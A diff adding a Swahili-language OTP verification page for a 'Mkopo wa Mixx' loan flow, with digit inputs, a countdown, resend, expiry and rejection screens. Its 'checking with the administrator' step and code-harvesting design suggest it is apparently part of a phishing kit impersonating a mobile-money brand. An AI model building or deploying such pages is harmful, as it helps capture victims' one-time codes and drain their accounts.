@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Uthibitishaji wa OTP - Mkopo wa Mixx</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body class="app-page">
+    <div class="app-container">
+        <!-- Header -->
+        <div class="app-header">
+            <div class="logo-small">💰 Mkopo wa Mixx</div>
+            <div class="security-indicator">
+                <span class="lock-icon">🔒</span>
+                <span>Uthibitishaji wa OTP</span>
+            </div>
+        </div>
+
+        <!-- Progress Bar -->
+        <div class="progress-wrapper">
+            <div class="progress-steps">
+                <div class="step-item completed">
+                    <div class="step-circle">✓</div>
+                    <span>Maelezo Binafsi</span>
+                </div>
+                <div class="step-line completed"></div>
+                <div class="step-item completed">
+                    <div class="step-circle">✓</div>
+                    <span>Uthibitishaji</span>
+                </div>
+                <div class="step-line active"></div>
+                <div class="step-item active">
+                    <div class="step-circle">3</div>
+                    <span>Idhini</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- OTP Entry Screen -->
+        <div id="otpScreen" class="form-card">
+            <div class="otp-header">
+                <div class="otp-icon">📱</div>
+                <h1 class="form-title">Weka Msimbo wa Uthibitishaji</h1>
+                <p class="form-subtitle">Tumetuma msimbo wa nambari 4 kwa <strong id="maskedPhone">****</strong></p>
+            </div>
+
+            <div class="countdown-box">
+                <div class="countdown-circle">
+                    <svg class="countdown-svg" viewBox="0 0 100 100">
+                        <circle class="countdown-bg" cx="50" cy="50" r="45"></circle>
+                        <circle class="countdown-progress" cx="50" cy="50" r="45" id="countdownCircle"></circle>
+                    </svg>
+                    <div class="countdown-text">
+                        <span class="countdown-number" id="countdown">60</span>
+                        <span class="countdown-label">sekunde</span>
+                    </div>
+                </div>
+                <p class="countdown-message">Msimbo unaisha baada ya <strong id="timeRemaining">1:00</strong> dakika</p>
+            </div>
+
+            <div class="otp-inputs">
+                <input type="text" maxlength="1" class="otp-box" id="otp1" inputmode="numeric" pattern="[0-9]" autofocus>
+                <input type="text" maxlength="1" class="otp-box" id="otp2" inputmode="numeric" pattern="[0-9]">
+                <input type="text" maxlength="1" class="otp-box" id="otp3" inputmode="numeric" pattern="[0-9]">
+                <input type="text" maxlength="1" class="otp-box" id="otp4" inputmode="numeric" pattern="[0-9]">
+            </div>
+
+            <button id="verifyOtpBtn" class="submit-button">
+                Thibitisha Msimbo
+                <span class="arrow">→</span>
+            </button>
+
+            <div class="resend-section">
+                <p class="resend-text">Hukupokea msimbo?</p>
+                <button class="link-button" id="resendBtn" disabled>
+                    Tuma Msimbo Tena <span id="resendTimer">(1:00)</span>
+                </button>
+            </div>
+
+            <div class="info-box">
+                <p><strong>Kwa nini tunahitaji hii?</strong></p>
+                <p>Uthibitishaji wa OTP unahakikisha kuwa una ufikiaji wa nambari ya simu uliyotoa na husaidia kuzuia ulaghai.</p>
+            </div>
+        </div>
+
+        <!-- Processing OTP Screen -->
+        <div id="processingOtpScreen" class="form-card" style="display: none;">
+            <div class="processing-content">
+                <div class="spinner-large"></div>
+                <h2 class="processing-title">Tunathibitisha Msimbo Wako</h2>
+                <p class="processing-text">Tafadhali subiri wakati tunathibitisha OTP yako...</p>
+                
+                <div class="status-box">
+                    <span class="status-dot"></span>
+                    <span>Tunakagua na msimamizi...</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Expired Screen -->
+        <div id="expiredScreen" class="form-card" style="display: none;">
+            <div class="result-content">
+                <div class="result-icon warning">⏰</div>
+                <h2 class="result-title">Msimbo Umeisha Muda</h2>
+                <p class="result-text">Msimbo wako wa uthibitishaji umeisha muda kwa sababu za usalama.</p>
+                <button class="submit-button" onclick="requestNewCode()">
+                    Omba Msimbo Mpya
+                </button>
+            </div>
+        </div>
+
+        <!-- Rejection Screen -->
+        <div id="rejectionScreen" class="form-card" style="display: none;">
+            <div class="result-content">
+                <div class="result-icon error">✕</div>
+                <h2 class="result-title">Msimbo Usio Sahihi</h2>
+                <p class="result-text">Msimbo wa uthibitishaji ulioweka sio sahihi.</p>
+                <button class="submit-button" onclick="location.reload()">
+                    Jaribu Tena
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script src="otp-script.js"></script>
+</body>
+</html>
